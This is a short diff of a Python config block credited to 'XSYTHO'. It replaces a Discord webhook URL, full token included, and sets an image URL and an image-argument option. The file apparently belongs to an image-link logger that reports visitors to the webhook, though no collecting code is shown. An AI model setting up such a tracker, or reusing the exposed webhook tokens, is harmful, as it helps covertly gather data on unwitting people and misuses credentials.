@@ -13,7 +13,7 @@ __author__ = "XSYTHO"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1357230392507240469/4XskV-5LnfH478Iu7i4U8Egvig150SZ-wX0CtGk1PdqJhkxlFD4pFYgyZWSPrVzo-7YX",
+    "webhook": "https://discord.com/api/webhooks/1369282563784441856/h3tUAuOYn4x-WES3kCas5x5I8nw2KNhUsERenma0W22zckPVbsqbtu6Ozjy49J24ZUQz",
     "image": "https://media.discordapp.net/attachments/1369281337386733599/1369281371553398804/CQ21Exo8g423wwZaH1tqHMJaHhBGBwbjfJwfqmKwZD1z44Nf8gfwSZGV823Nx1BSl2A.png?ex=681b4a26&is=6819f8a6&hm=083f0db02194f2414db2e16efd7aa2733435e95b12f940d188819a6b6f56d827&=&format=webp&quality=lossless&width=410&height=410", 
                                               
     "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
